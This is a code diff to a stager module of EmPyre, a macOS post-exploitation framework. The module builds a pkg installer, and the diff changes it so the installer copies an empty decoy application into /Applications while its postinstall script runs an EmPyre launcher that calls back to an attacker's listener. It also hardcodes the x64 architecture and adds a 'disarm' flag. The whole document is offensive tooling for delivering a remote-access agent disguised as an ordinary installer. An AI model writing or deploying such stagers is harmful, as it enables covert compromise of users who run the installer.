@@ -9,7 +9,7 @@ class Stager:
 
             'Author': ['@xorrior'],
 
-            'Description': ('Generates a pkg installer. This will install an EmPyre application bundle in the /Applications directory and execute it.'),
+            'Description': ('Generates a pkg installer. The installer will copy a custom (empty) application to the /Applications folder. The postinstall script will execute an EmPyre launcher.'),
 
             'Comments': [
                 ''
@@ -36,7 +36,7 @@ class Stager:
                 'Value'         :   ''
             },
             'OutFile' : {
-                'Description'   :   'File to write pkg to.',
+                'Description'   :   'File to write dmg volume to.',
                 'Required'      :   True,
                 'Value'         :   '/tmp/out.pkg'
             },
@@ -49,11 +49,6 @@ class Stager:
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
-            },
-            'Architecture' : {
-                'Description'   :   'Architecture to use for the application bundle. x86 or x64',
-                'Required'      :   True,
-                'Value'         :   'x64'
             }
         }
 
@@ -74,9 +69,9 @@ class Stager:
         savePath = self.options['OutFile']['Value']
         userAgent = self.options['UserAgent']['Value']
         LittleSnitch = self.options['LittleSnitch']['Value']
-        arch = self.options['Architecture']['Value']
         icnsPath = self.options['AppIcon']['Value']
         AppName = self.options['AppName']['Value']
+        arch = 'x64'
 
         # generate the launcher code
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, userAgent=userAgent,  littlesnitch=LittleSnitch)
@@ -86,7 +81,8 @@ class Stager:
             return ""
 
         else:
-            launcher = launcher.strip('echo').strip(' | python &').strip("\"")
-            ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcher,Arch=arch,icon=icnsPath,AppName=AppName)
-            pkginstaller = self.mainMenu.stagers.generate_pkg(bundleZip=ApplicationZip,AppName=AppName)
+            Disarm=True
+            launcherCode = launcher.strip('echo').strip(' | python &').strip("\"")
+            ApplicationZip = self.mainMenu.stagers.generate_appbundle(launcherCode=launcherCode,Arch=arch,icon=icnsPath,AppName=AppName,disarm=Disarm)
+            pkginstaller = self.mainMenu.stagers.generate_pkg(launcher=launcher,bundleZip=ApplicationZip,AppName=AppName)
             return pkginstaller
